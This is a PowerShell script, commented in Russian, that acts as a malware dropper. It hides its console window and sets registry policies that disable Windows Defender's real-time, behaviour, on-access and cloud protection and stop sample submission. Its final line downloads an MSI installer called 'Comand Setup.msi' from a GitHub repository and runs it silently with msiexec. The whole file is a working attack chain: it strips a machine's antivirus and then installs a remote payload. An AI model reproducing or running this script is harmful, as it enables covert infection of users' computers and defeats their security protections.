# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}
# --- Config ---
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey   = "Signature Updates"
$SpynetKey             = "Spynet"

$base = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$rt   = "$base\Real-Time Protection"
$spy  = "$base\Spynet"

foreach ($p in @($base, $rt, $spy)) {
    if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
}

# Защита в реальном времени
Set-ItemProperty -Path $rt -Name "DisableRealtimeMonitoring"   -Type DWord -Value 1 -Force
Set-ItemProperty -Path $rt -Name "DisableBehaviorMonitoring"   -Type DWord -Value 1 -Force
Set-ItemProperty -Path $rt -Name "DisableOnAccessProtection"   -Type DWord -Value 1 -Force
Set-ItemProperty -Path $rt -Name "DisableScanOnRealtimeEnable" -Type DWord -Value 1 -Force
Set-ItemProperty -Path $rt -Name "DisableIOAVProtection"       -Type DWord -Value 1 -Force

# Облачная защита (MAPS / Spynet)
Set-ItemProperty -Path $spy -Name "SpynetReporting"         -Type DWord -Value 0 -Force
Set-ItemProperty -Path $spy -Name "DisableBlockAtFirstSeen" -Type DWord -Value 1 -Force

# Автоматическая отправка образцов (2 = никогда)
Set-ItemProperty -Path $spy -Name "SubmitSamplesConsent" -Type DWord -Value 2 -Force

# Облачная защита через не-политики (на случай, если политики игнорируются)
$spy2 = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet"
if (Test-Path $spy2) {
    Set-ItemProperty -Path $spy2 -Name "SpynetReporting"      -Type DWord -Value 0 -Force
    Set-ItemProperty -Path $spy2 -Name "SubmitSamplesConsent" -Type DWord -Value 2 -Force
}


$p="$env:TEMP\Comand Setup.msi"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
